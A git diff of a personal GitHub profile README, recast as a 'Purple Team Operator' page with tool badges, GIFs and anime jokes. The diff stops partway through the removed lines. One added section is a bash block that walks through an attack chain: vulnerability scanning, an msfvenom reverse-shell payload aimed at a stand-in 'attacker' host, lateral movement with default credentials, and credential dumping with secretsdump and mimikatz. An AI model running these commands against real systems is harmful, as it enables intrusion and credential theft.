@@ -1,1041 +1,388 @@
+# 🟣💀 PURPLE TEAM OPERATOR 💀🟣
+
+```
+██████╗ ██╗   ██╗██████╗ ██████╗ ██╗     ███████╗    ████████╗███████╗ █████╗ ███╗   ███╗
+██╔══██╗██║   ██║██╔══██╗██╔══██╗██║     ██╔════╝    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
+██████╔╝██║   ██║██████╔╝██████╔╝██║     █████╗         ██║   █████╗  ███████║██╔████╔██║
+██╔═══╝ ██║   ██║██╔══██╗██╔═══╝ ██║     ██╔══╝         ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
+██║     ╚██████╔╝██║  ██║██║     ███████╗███████╗       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
+╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
+```
+
 <div align="center">
 
-<img width="100%" src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=200&section=header&text=WELCOME%20TO%20MY%20PROFILE&fontSize=50&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Frontend%20Dev%20|%20CySec%20Enthusiast%20|%20Home%20Lab%20Builder&descAlignY=60&descSize=20"/>
+[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=24&duration=3000&pause=1000&color=9333EA&center=true&vCenter=true&multiline=true&repeat=true&width=700&height=100&lines=OFFENSIVE+%2B+DEFENSIVE+%3D+PURPLE+TEAM;Red+Team+Tactics+%7C+Blue+Team+Operations;Breaking+Systems+%26+Building+Defenses;Omae+wa+mou...+HACKED!+%F0%9F%94%A5)](https://git.io/typing-svg)
 
-<img src="https://user-images.githubusercontent.com/74038190/225813708-98b745f2-7d22-48cf-9150-083f1b00d6c9.gif" width="500">
+![Profile Views](https://komarev.com/ghpvc/?username=antrara&label=THREAT+ACTORS+DETECTED&color=9333ea&style=for-the-badge)
+[![GitHub Followers](https://img.shields.io/github/followers/antrara?label=ALLIES&style=for-the-badge&color=9333ea&logo=github)](https://github.com/antrara)
 
-# 👋 Hi, I'm **ANTRARA** 
+<img src="https://i.imgur.com/dBaSKWF.gif" height="30" width="100%">
 
-<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=35&duration=1500&pause=500&color=00D9FF&center=true&vCenter=true&multiline=true&repeat=true&width=1000&height=200&lines=%F0%9F%94%A5+Frontend+Developer+%F0%9F%94%A5;%F0%9F%94%90+Cybersecurity+Expert+%F0%9F%94%90;%E2%9C%85+QA+%26+Testing+Master+%E2%9C%85;%F0%9F%9B%A0%EF%B8%8F+Home+Lab+Architect+%F0%9F%9B%A0%EF%B8%8F;%F0%9F%9A%80+Always+Coding+%F0%9F%9A%80;%F0%9F%92%BB+Breaking+%26+Building+Things+%F0%9F%92%BB;%F0%9F%A4%96+Automation+Ninja+%F0%9F%A4%96" alt="Typing SVG" />
+### 🎌 WELCOME TO MY CYBER DOJO 🎌
 
-<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="1000">
-
-[![Profile Views](https://komarev.com/ghpvc/?username=antrara&label=PROFILE+VIEWS&color=blueviolet&style=for-the-badge)](https://github.com/antrara)
-[![Followers](https://img.shields.io/github/followers/antrara?label=FOLLOWERS&style=for-the-badge&color=blue&logo=github)](https://github.com/antrara?tab=followers)
-[![Stars](https://img.shields.io/github/stars/antrara?label=TOTAL+STARS&style=for-the-badge&color=yellow&logo=github)](https://github.com/antrara?tab=repositories)
-[![Repos](https://img.shields.io/badge/REPOS-4-orange?style=for-the-badge&logo=github)](https://github.com/antrara?tab=repositories)
-[![Years](https://img.shields.io/badge/CODING-2+%20YEARS-green?style=for-the-badge&logo=clockify)](https://github.com/antrara)
-
-<img src="https://user-images.githubusercontent.com/74038190/212284158-e840e285-664b-44d7-b79b-e264b5e54825.gif" width="400">
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExaWx4cGFvZmN3NGpsYTh4eGtjMThiMGF3cXkyZnk3ZTBteTN6YXJqciZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/077i6AULCXc0FKTj9s/giphy.gif" width="400">
 
 </div>
 
 ---
 
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
+## 🎯 PURPLE TEAM MISSION BRIEF
 
 <div align="center">
 
-## 🎓 **LEARNING ARSENAL & INDUSTRY INTEL** 🎓
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYjVzbXAzYzJxeXoxdnBqcXBpM3MzanR4anBpYnlvdXd0Y2d3YzlwdyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/f6hnhHkks8bk4jwjh3/giphy.gif" width="500">
 
-<img src="https://user-images.githubusercontent.com/74038190/235224431-e8c8c12e-6826-47f1-89fb-2ddad83b3abf.gif" width="300">
-
-### 🔥 **WHERE I SHARPEN MY SKILLS** 🔥
-
-<img src="https://user-images.githubusercontent.com/74038190/212284087-bbe7e430-757e-4901-90bf-4cd2ce3e1852.gif" width="100">
+*"In the world of cybersecurity, there are only two types of companies: those that have been hacked, and those that don't know they've been hacked yet."* 🎭
 
 </div>
 
----
-
-<table width="100%">
-<tr>
-<td width="50%" valign="top">
-
-### 🎯 **CYBERSECURITY PLATFORMS & LABS** 🎯
-
-<div align="center">
-<img src="https://user-images.githubusercontent.com/74038190/212257468-1e9a91f1-b626-4baa-b15d-5c385dfa7ed2.gif" width="120">
-</div>
-
-#### 🚀 **ACTIVE TRAINING GROUNDS**
-
-<img src="https://tryhackme-badges.s3.amazonaws.com/antrara.png" alt="TryHackMe Badge" width="200">
-
-**🔴 TryHackMe**
-```bash
-$ attack_defense_mode: ACTIVE
-> Mastering guided labs & scenarios
-> Hands-on cybersecurity training
-> Real-world attack simulations
-```
-[![TryHackMe](https://img.shields.io/badge/TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
-
-**🟢 Hack The Box**
-```python
-penetration_level = "Advanced"
-mode = "Realistic Attack Simulations"
-status = "Actively Pwning Boxes 💀"
-```
-[![HackTheBox](https://img.shields.io/badge/HackTheBox-111927?style=for-the-badge&logo=hackthebox&logoColor=9FEF00)](https://hackthebox.eu)
-
-**🟠 PortSwigger Web Security Academy**
 ```javascript
-const webSec = {
-    focus: "Web Application Security",
-    practice: "Burp Suite Labs",
-    level: "Advanced Training"
-}
-```
-[![PortSwigger](https://img.shields.io/badge/PortSwigger-FF6633?style=for-the-badge&logo=burpsuite&logoColor=white)](https://portswigger.net)
-
-**⚡ OverTheWire**
-```bash
-#!/bin/bash
-echo "Linux Security Challenges"
-echo "Command-line mastery unlocked 🔓"
-```
-[![OverTheWire](https://img.shields.io/badge/OverTheWire-000000?style=for-the-badge&logo=linux&logoColor=white)](https://overthewire.org)
-
-<div align="center">
-
-**📊 LAB STATS**
-| Platform | Level | Status |
-|----------|-------|--------|
-| 🔴 TryHackMe | ⭐⭐⭐⭐☆ | Active |
-| 🟢 Hack The Box | ⭐⭐⭐⭐☆ | Active |
-| 🟠 PortSwigger | ⭐⭐⭐⭐☆ | Training |
-| ⚡ OverTheWire | ⭐⭐⭐⭐⭐ | Mastered |
-
-</div>
-
-</td>
-<td width="50%" valign="top">
-
-### 🎤 **INDUSTRY CONFERENCES & INTEL** 🎤
-
-<div align="center">
-<img src="https://user-images.githubusercontent.com/74038190/212257467-871d32b7-e401-42e8-a166-fcfd7baa4c6b.gif" width="120">
-</div>
-
-#### 🔥 **KNOWLEDGE SOURCES**
-
-**⚫ Black Hat**
-```python
-research_focus = {
-    "level": "Enterprise Security",
-    "topics": [
-        "Advanced Threat Intelligence",
-        "Zero-Day Research",
-        "Security Techniques"
+const purpleTeamOp = {
+    callSign: "ANTRARA",
+    classification: "PURPLE TEAM OPERATOR",
+    clearanceLevel: "TOP SECRET // NOFORN",
+    specialization: [
+        "🔴 Red Team: Offensive Security Operations",
+        "🔵 Blue Team: Defensive Security Operations", 
+        "🟣 Purple Team: Collaborative Security Testing"
     ],
-    "attending": "Virtually & Physically"
-}
-```
-[![BlackHat](https://img.shields.io/badge/Black_Hat-000000?style=for-the-badge&logo=blackhat&logoColor=white)](https://blackhat.com)
-
-**🔴 DEF CON**
-```bash
-$ cat defcon.conf
-> Offensive Security: ENABLED
-> Vulnerability Research: ACTIVE
-> Community Engagement: MAXIMUM
-> Hacker Mindset: TRUE
-```
-[![DEFCON](https://img.shields.io/badge/DEF_CON-FF0000?style=for-the-badge&logo=defcon&logoColor=white)](https://defcon.org)
-
-**🔴 Red Hat**
-```javascript
-const enterprise = {
-    focus: "Linux Administration",
-    expertise: "Open Source Security",
-    practices: "Enterprise Hardening"
-}
-```
-[![RedHat](https://img.shields.io/badge/Red_Hat-EE0000?style=for-the-badge&logo=redhat&logoColor=white)](https://redhat.com)
-
-<div align="center">
-
-**🎯 CONFERENCE ENGAGEMENT**
-
-<img src="https://img.shields.io/badge/Black_Hat-Following-000000?style=flat-square" />
-<img src="https://img.shields.io/badge/DEF_CON-Engaged-FF0000?style=flat-square" />
-<img src="https://img.shields.io/badge/Red_Hat-Learning-EE0000?style=flat-square" />
-
-</div>
-
-</td>
-</tr>
-<tr>
-<td colspan="2">
-
-<div align="center">
-
-### 📚 **DOCUMENTATION & TECHNICAL REFERENCES** 📚
-
-<img src="https://user-images.githubusercontent.com/74038190/212257460-738ff738-247f-4445-a718-cdd0ca76e2db.gif" width="120">
-
-</div>
-
-<table width="100%">
-<tr>
-<td width="25%" align="center">
-
-**🐉 Kali Linux Docs**
-
-<img src="https://www.kali.org/images/kali-logo.svg" width="80">
-
-```bash
-$ man kali
-```
-
-Security toolsets & testing methodologies
-
-[![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)](https://kali.org/docs)
-
-</td>
-<td width="25%" align="center">
-
-**🎩 Red Hat Docs**
-
-<img src="https://img.icons8.com/color/96/000000/redhat.png" width="80">
-
-```bash
-$ rhel --docs
-```
-
-Enterprise Linux & security hardening
-
-[![RHEL](https://img.shields.io/badge/RHEL_Docs-EE0000?style=for-the-badge&logo=redhat&logoColor=white)](https://access.redhat.com/documentation)
-
-</td>
-<td width="25%" align="center">
-
-**⚔️ MITRE ATT&CK**
-
-<img src="https://img.icons8.com/external-flaticons-flat-flat-icons/96/000000/external-attack-martial-arts-flaticons-flat-flat-icons.png" width="80">
-
-```python
-framework = "TTPs"
-```
-
-Adversary tactics & techniques framework
-
-[![MITRE](https://img.shields.io/badge/MITRE_ATT&CK-005B94?style=for-the-badge&logo=mitre&logoColor=white)](https://attack.mitre.org)
-
-</td>
-<td width="25%" align="center">
-
-**🛡️ OWASP**
-
-<img src="https://owasp.org/assets/images/logo.png" width="80">
-
-```javascript
-top10 = true;
-```
-
-Application security standards & frameworks
-
-[![OWASP](https://img.shields.io/badge/OWASP-000000?style=for-the-badge&logo=owasp&logoColor=white)](https://owasp.org)
-
-</td>
-</tr>
-</table>
-
-</td>
-</tr>
-<tr>
-<td colspan="2">
-
-<div align="center">
-
-### 💻 **CODE & OPEN-SOURCE ECOSYSTEM** 💻
-
-<img src="https://user-images.githubusercontent.com/74038190/212257454-16e3712e-945a-4ca2-b238-408ad0bf87e6.gif" width="120">
-
-</div>
-
-<table width="100%">
-<tr>
-<td width="50%" align="center" valign="top">
-
-**🐙 GitHub Universe**
-
-<img src="https://user-images.githubusercontent.com/74038190/212257463-4d082cb4-7483-4eaf-bc25-6dde2628aabd.gif" width="150">
-
-```python
-class OpenSource:
-    def __init__(self):
-        self.focus = [
-            "Security Tools",
-            "Automation Scripts",
-            "Research Projects"
-        ]
-        self.contribution = "Active"
-        self.learning = "Continuous"
-```
-
-**🔥 WHAT I'M EXPLORING:**
-- 🛠️ Security automation tools
-- 🔐 Vulnerability scanners
-- 🤖 Python security scripts
-- 🔍 OSINT frameworks
-- 🚀 DevSecOps pipelines
-
-[![GitHub](https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white)](https://github.com)
-
-</td>
-<td width="50%" align="center" valign="top">
-
-**💣 Exploit Database**
-
-<img src="https://user-images.githubusercontent.com/74038190/212257465-7ce8d493-cac5-494e-982a-5a9deb852c4b.gif" width="150">
-
-```bash
-#!/bin/bash
-searchsploit --update
-echo "Vulnerability research mode: ACTIVE"
-```
-
-**🎯 RESEARCH FOCUS:**
-- 🔓 Public vulnerability database
-- 💥 Exploit references & PoCs
-- 📊 CVE tracking & analysis
-- 🎓 Security research papers
-- ⚡ Latest threat intelligence
-
-[![ExploitDB](https://img.shields.io/badge/Exploit_DB-FF0000?style=for-the-badge&logo=exploit-database&logoColor=white)](https://exploit-db.com)
-
-</td>
-</tr>
-</table>
-
-</td>
-</tr>
-</table>
-
-<div align="center">
-
-<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="1000">
-
-### 🎯 **LEARNING ORIENTATION** 🎯
-
-<img src="https://user-images.githubusercontent.com/74038190/216122069-5b8169d7-1d8e-4a13-b245-a8e4176c99f8.png" width="150">
-
-</div>
-
-<table width="100%">
-<tr>
-<td width="33%" align="center" valign="top">
-
-### 🏢 **INDUSTRY-ALIGNED**
-
-<img src="https://user-images.githubusercontent.com/74038190/212257472-08e52665-c503-4bd9-aa20-f5a4dae769b5.gif" width="100">
-
-```typescript
-const approach = {
-    alignment: "Industry Standards",
-    practices: "Real-World",
-    compliance: "Best Practices"
-}
-```
-
-✅ Following industry standards
-<br/>
-✅ Real-world scenarios
-<br/>
-✅ Professional methodologies
-<br/>
-✅ Compliance-focused
-
-</td>
-<td width="33%" align="center" valign="top">
-
-### ⚔️ **OFFENSIVE & DEFENSIVE**
-
-<img src="https://user-images.githubusercontent.com/74038190/212257468-1e9a91f1-b626-4baa-b15d-5c385dfa7ed2.gif" width="100">
-
-```python
-security_domains = {
-    "offensive": "Red Team Tactics",
-    "defensive": "Blue Team Ops",
-    "balance": "Purple Team Mind"
-}
-```
-
-🔴 Offensive Security (Red Team)
-<br/>
-🔵 Defensive Security (Blue Team)
-<br/>
-🟣 Combined Approach (Purple)
-<br/>
-⚡ Full-spectrum mindset
-
-</td>
-<td width="33%" align="center" valign="top">
-
-### 🚀 **CONTINUOUS GROWTH**
-
-<img src="https://user-images.githubusercontent.com/74038190/212257454-16e3712e-945a-4ca2-b238-408ad0bf87e6.gif" width="100">
-
-```bash
-while true; do
-    learn_new_skill
-    practice_daily
-    contribute_community
-    level_up
-done
-```
-
-📚 Community-driven learning
-<br/>
-🔬 Research-based approach
-<br/>
-🧪 Lab-first methodology
-<br/>
-♾️ Never stop improving
-
-</td>
-</tr>
-</table>
-
-<div align="center">
-
-### 🏆 **COMMITMENT TO EXCELLENCE** 🏆
-
-<img src="https://user-images.githubusercontent.com/74038190/216122041-518ac897-8d92-4c6b-9b3f-ca01dcaf38ee.png" width="100" />
-
-```javascript
-const philosophy = {
-    learning: "Hands-on & Practical",
-    community: "Active Contributor",
-    ethics: "Responsible Security",
-    growth: "Continuous & Relentless"
+    missionObjective: "SIMULATE. DETECT. DEFEND. IMPROVE.",
+    currentOps: {
+        redTeam: ["Penetration Testing", "Exploit Development", "Social Engineering"],
+        blueTeam: ["Threat Hunting", "SIEM Operations", "Incident Response"],
+        purpleTeam: ["Attack Simulation", "Detection Engineering", "Security Validation"]
+    },
+    operationalStatus: "ACTIVE",
+    threatLevel: "CRITICAL",
+    animeReference: "My security is over 9000! 🔥"
 };
-
-console.log("Breaking things to make them stronger 💪");
 ```
-
-<img src="https://img.shields.io/badge/Learning-Never_Stops-00D9FF?style=for-the-badge" />
-<img src="https://img.shields.io/badge/Community-Active-FF6D00?style=for-the-badge" />
-<img src="https://img.shields.io/badge/Ethics-First-success?style=for-the-badge" />
-<img src="https://img.shields.io/badge/Growth-Continuous-blueviolet?style=for-the-badge" />
-
-</div>
 
 ---
 
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
+## ⚔️ OFFENSIVE ARSENAL (RED TEAM)
 
 <div align="center">
 
-## 🚀 **ABOUT THIS LEGEND** 🚀
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbXJ0MHc0aDh5MGxwODFqMWVzczdoN3g5eGN1YzBxN3R0NXBhNGRmcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/unQ3IJU2RG7DO/giphy.gif" width="400">
+
+*"I am the bone of my exploit, Shellcode is my body and assembly is my blood..."* ⚔️
 
 </div>
 
-<img align="right" alt="Coding" width="420" src="https://raw.githubusercontent.com/abhisheknaiidu/abhisheknaiidu/master/code.gif">
+### 🗡️ Penetration Testing & Exploitation
+![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
+![Parrot OS](https://img.shields.io/badge/Parrot_OS-33CCCC?style=for-the-badge&logo=linux&logoColor=white)
+![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=for-the-badge&logo=metasploit&logoColor=white)
+![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=for-the-badge&logo=burp-suite&logoColor=white)
 
-```typescript
-class Antrara extends Developer {
-    constructor() {
-        super();
-        this.name = "Antrara";
-        this.location = "Anywhere 🌍";
-        this.role = "Frontend Developer";
-        this.age = this.calculateAge();
-    }
+### 🎯 Hacking Platforms & Training
+![TryHackMe](https://img.shields.io/badge/TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)
+![HackTheBox](https://img.shields.io/badge/HackTheBox-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
+![PortSwigger](https://img.shields.io/badge/PortSwigger-FF6633?style=for-the-badge&logo=burp-suite&logoColor=white)
+![PentesterLab](https://img.shields.io/badge/PentesterLab-00A3E0?style=for-the-badge&logo=hackaday&logoColor=white)
 
-    getCurrentStatus(): Status {
-        return {
-            focus: [
-                "🏠 Building Epic Home Lab",
-                "🔐 Mastering Cybersecurity", 
-                "☁️ Conquering Cloud Infrastructure",
-                "🤖 Automating EVERYTHING"
-            ],
-            learning: [
-                "🛡️ Penetration Testing",
-                "🔒 DevSecOps",
-                "🐳 Container Orchestration",
-                "⚡ Performance Optimization"
-            ],
-            workingOn: [
-                "🔧 Home Lab Automation",
-                "🌐 Personal Portfolio v3",
-                "📱 Open Source Projects",
-                "🎮 Discord Bot Development"
-            ]
-        };
-    }
+### 💣 Exploit Development & Research
+![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
+![C](https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white)
+![C++](https://img.shields.io/badge/C++-00599C?style=for-the-badge&logo=cplusplus&logoColor=white)
+![Rust](https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white)
+![Assembly](https://img.shields.io/badge/Assembly-654FF0?style=for-the-badge&logo=assemblyscript&logoColor=white)
 
-    getSuperpowers(): string[] {
-        return [
-            "☕ Converting Coffee to Code",
-            "🐛 Debugging Like a Boss",
-            "🔥 Making Servers Go Brrr",
-            "💡 Breaking Things Professionally",
-            "🚀 Shipping Code at Light Speed",
-            "🎯 Testing Everything Twice"
-        ];
-    }
-
-    contactMe(): SocialLinks {
-        return {
-            askMeAbout: [
-                "Cybersecurity 🛡️",
-                "QA & Testing ✅",
-                "Home Lab Magic 🖥️",
-                "Automation Wizardry 🤖",
-                "Linux Kung Fu 🐧"
-            ],
-            funFact: "💭 I may be slow to respond... but worth the wait! ⚡"
-        };
-    }
-}
-```
-
-<br clear="right"/>
-
-<div align="center">
-
-<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="1000">
-
-</div>
+### 🦠 Malware Analysis & Reverse Engineering
+![IDA Pro](https://img.shields.io/badge/IDA_Pro-00A4EF?style=for-the-badge&logo=ida&logoColor=white)
+![Ghidra](https://img.shields.io/badge/Ghidra-FF0000?style=for-the-badge&logo=ghidra&logoColor=white)
+![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white)
+![Volatility](https://img.shields.io/badge/Volatility-000000?style=for-the-badge&logo=v&logoColor=white)
 
 ---
 
-<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="1000">
+## 🛡️ DEFENSIVE SYSTEMS (BLUE TEAM)
 
 <div align="center">
 
-## 💪 **TECHNICAL SUPERPOWERS** 💪
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZjlyZzVpZTlpdGZ1YjF4dTBiaHRuczBsNGFlOGdtdmpjZjVjazg1cCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7bu3XilJ5BOiSGic/giphy.gif" width="400">
 
-<img src="https://user-images.githubusercontent.com/74038190/212257468-1e9a91f1-b626-4baa-b15d-5c385dfa7ed2.gif" width="150">
+*"If you know the enemy and know yourself, you need not fear the result of a hundred battles."* - Sun Tzu 🛡️
 
 </div>
 
-<table width="100%">
-<tr>
-<td width="50%" valign="top">
+### 🔍 Threat Detection & Monitoring
+![Splunk](https://img.shields.io/badge/Splunk-000000?style=for-the-badge&logo=splunk&logoColor=white)
+![ELK Stack](https://img.shields.io/badge/ELK_Stack-005571?style=for-the-badge&logo=elastic&logoColor=white)
+![Wazuh](https://img.shields.io/badge/Wazuh-005EB8?style=for-the-badge&logo=wazuh&logoColor=white)
+![Suricata](https://img.shields.io/badge/Suricata-EF3B2D?style=for-the-badge&logo=suricata&logoColor=white)
 
-### 🐧 **OPERATING SYSTEMS & VIRTUALIZATION** 🐧
+### 🚨 Incident Response & Forensics
+![Velociraptor](https://img.shields.io/badge/Velociraptor-FF0000?style=for-the-badge&logo=v&logoColor=white)
+![TheHive](https://img.shields.io/badge/TheHive-FFA500?style=for-the-badge&logo=hive&logoColor=white)
+![MISP](https://img.shields.io/badge/MISP-0088CC?style=for-the-badge&logo=malwarebytes&logoColor=white)
+![Autopsy](https://img.shields.io/badge/Autopsy-000000?style=for-the-badge&logo=a&logoColor=white)
 
-<img src="https://user-images.githubusercontent.com/74038190/212257465-7ce8d493-cac5-494e-982a-5a9deb852c4b.gif" width="80" align="right">
+### 🔐 Security Hardening & Configuration
+![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
+![Kubernetes](https://img.shields.io/badge/Kubernetes-326CE5?style=for-the-badge&logo=kubernetes&logoColor=white)
+![Ansible](https://img.shields.io/badge/Ansible-EE0000?style=for-the-badge&logo=ansible&logoColor=white)
+![Terraform](https://img.shields.io/badge/Terraform-7B42BC?style=for-the-badge&logo=terraform&logoColor=white)
+
+---
+
+## 🟣 PURPLE TEAM OPERATIONS
+
+<div align="center">
+
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN2V6aGJsZnhoaTh5NTk5aGdjbmV3cG12OGhsdzJmNWR0ZnJkdGNnaCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l4FGni1RBAR2OWsGk/giphy.gif" width="400">
+
+*"The fusion of offense and defense creates the ultimate security jutsu!"* 🟣⚡
+
+</div>
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│  ATTACK SIMULATION CYCLE                                    │
+├─────────────────────────────────────────────────────────────┤
+│                                                             │
+│  🔴 RED TEAM          ➜  🟣 PURPLE TEAM  ➜  🔵 BLUE TEAM   │
+│                                                             │
+│  • Execute Attack     ➜  • Document TTPs  ➜  • Detect      │
+│  • Bypass Controls    ➜  • Validate       ➜  • Respond     │
+│  • Exploit Weakness   ➜  • Collaborate    ➜  • Improve     │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+```
+
+### 🎭 Attack Simulation Frameworks
+- **MITRE ATT&CK** - Adversary tactics and techniques mapping
+- **Atomic Red Team** - Automated attack simulation tests
+- **Caldera** - Automated adversary emulation platform
+- **VECTR** - Purple team collaboration platform
+
+### 📊 Purple Team Methodology
+1. **🎯 PLAN** - Define attack scenarios & success criteria
+2. **⚔️ ATTACK** - Red team executes realistic adversary TTPs
+3. **🔍 DETECT** - Blue team identifies and responds to attacks
+4. **📝 DOCUMENT** - Purple team records findings and gaps
+5. **🛠️ IMPROVE** - Implement controls and validate effectiveness
+6. **🔄 REPEAT** - Continuous security validation cycle
+
+---
+
+## 💻 EXPLOITATION TECHNIQUES
+
+<div align="center">
+
+<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbXNwMWZybXJ3cjljNmJ4a3N6ZGFrN3FsbGczcDJ5aGo5MG9hbGlmaCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/ZVik7pBtu9dNS/giphy.gif" width="400">
+
+*"Omae wa mou... EXPLOITED! 💀"*
+
+</div>
 
 ```bash
-$ whoami
-> System Administrator & VM Architect
+# RECON PHASE
+└─$ nmap -sS -sV -O -p- --script vuln target.com
+└─$ subfinder -d target.com | httpx | nuclei -t cves/
+└─$ ffuf -w wordlist.txt -u https://target.com/FUZZ
+
+# WEAPONIZATION
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f elf > payload
+└─$ python3 exploit.py --target victim.com --payload shellcode.bin
+
+# LATERAL MOVEMENT  
+└─$ crackmapexec smb 192.168.1.0/24 -u admin -p password --shares
+└─$ evil-winrm -i target -u administrator -p password
+
+# EXFILTRATION
+└─$ impacket-secretsdump DOMAIN/USER:PASS@target
+└─$ mimikatz # sekurlsa::logonpasswords
 ```
 
-**🔥 EXPERTISE:**
-- 🐧 **Linux Administration**
-  - Kali Linux (Pentesting Beast)
-  - Ubuntu (Daily Driver)
-  - Command-line ninja
-- 🪟 **Windows Troubleshooting**
-  - System diagnostics
-  - Performance optimization
-- 📦 **Virtual Machines**
-  - VirtualBox mastery
-  - Multi-OS environments
-- 🧪 **Lab Environments**
-  - Security testing labs
-  - Isolated network zones
+---
 
-**⚡ POWER LEVEL:** ████████░░ 80%
-
-</td>
-<td width="50%" valign="top">
-
-### 🌐 **NETWORKING & INFRASTRUCTURE** 🌐
-
-<img src="https://user-images.githubusercontent.com/74038190/212257460-738ff738-247f-4445-a718-cdd0ca76e2db.gif" width="80" align="right">
-
-```bash
-$ netstat -tuln
-> All ports under my control
-```
-
-**🔥 EXPERTISE:**
-- 🔌 **Network Protocols**
-  - TCP/IP stack mastery
-  - DNS, DHCP, NAT config
-- 🔧 **Network Config**
-  - Fault isolation expert
-  - Traffic optimization
-- 🛡️ **Firewall & Security**
-  - pfSense implementation
-  - Gateway hardening
-- 🎯 **Network Design**
-  - Segmentation strategies
-  - Traffic control systems
-
-**⚡ POWER LEVEL:** ████████░░ 85%
-
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
-
-### 🔐 **CYBERSECURITY & SEC OPS** 🔐
-
-<img src="https://user-images.githubusercontent.com/74038190/212257467-871d32b7-e401-42e8-a166-fcfd7baa4c6b.gif" width="80" align="right">
-
-```python
-def hack_the_planet():
-    return "Ethically, of course! 😎"
-```
-
-**🔥 EXPERTISE:**
-- 🛡️ **Security Principles**
-  - Best practices adherent
-  - Security-first mindset
-- ⚔️ **Ethical Hacking**
-  - Pentesting methodologies
-  - Kali Linux toolset master
-- 🎯 **Vulnerability Analysis**
-  - OWASP Top 10 expert
-  - Threat identification
-  - Mitigation strategies
-- 🔍 **Reconnaissance**
-  - Information gathering
-  - Target enumeration
-- ⚖️ **Ethics & Compliance**
-  - Legal frameworks
-  - Responsible disclosure
-
-**⚡ POWER LEVEL:** ████████░░ 90%
-
-</td>
-<td width="50%" valign="top">
-
-### 💻 **PROGRAMMING & SCRIPTING** 💻
-
-<img src="https://user-images.githubusercontent.com/74038190/212257454-16e3712e-945a-4ca2-b238-408ad0bf87e6.gif" width="80" align="right">
-
-```python
-languages = {
-    "Python": "Automation Master",
-    "Bash": "Linux Wizard",
-    "C": "System Sorcerer",
-    "Ruby": "Security Ninja"
-}
-```
-
-**🔥 EXPERTISE:**
-- 🐍 **Python**
-  - Automation scripts
-  - Task orchestration
-  - Security tools
-- 📜 **Bash Scripting**
-  - Linux automation
-  - System administration
-  - One-liners master
-- ⚙️ **C Programming**
-  - System-level code
-  - Performance critical apps
-- 💎 **Ruby**
-  - Security tooling
-  - Metasploit scripting
-
-**⚡ POWER LEVEL:** ███████░░░ 75%
-
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
-
-### 🛠️ **TOOLS & PRACTICES** 🛠️
-
-<img src="https://user-images.githubusercontent.com/74038190/212257463-4d082cb4-7483-4eaf-bc25-6dde2628aabd.gif" width="80" align="right">
-
-```bash
-$ git commit -m "Perfect code, no bugs"
-> Mission accomplished! ✅
-```
-
-**🔥 EXPERTISE:**
-- 💻 **Command Line Pro**
-  - Terminal first approach
-  - Automation junkie
-- 🔀 **Version Control**
-  - Git workflows master
-  - Collaborative coding
-- 🔧 **Troubleshooting**
-  - System diagnostics
-  - Network analysis
-  - Root cause finding
-- 📝 **Documentation**
-  - Technical writing
-  - Incident reporting
-  - Knowledge transfer
-
-**⚡ POWER LEVEL:** ████████░░ 85%
-
-</td>
-<td width="50%" valign="top">
-
-### 🎯 **PROFESSIONAL FOCUS** 🎯
-
-<img src="https://user-images.githubusercontent.com/74038190/212284136-03988914-d899-44b4-b1d9-4eeccf656e44.gif" width="80" align="right">
-
-```javascript
-const career = {
-    target: "CyberSec Operations",
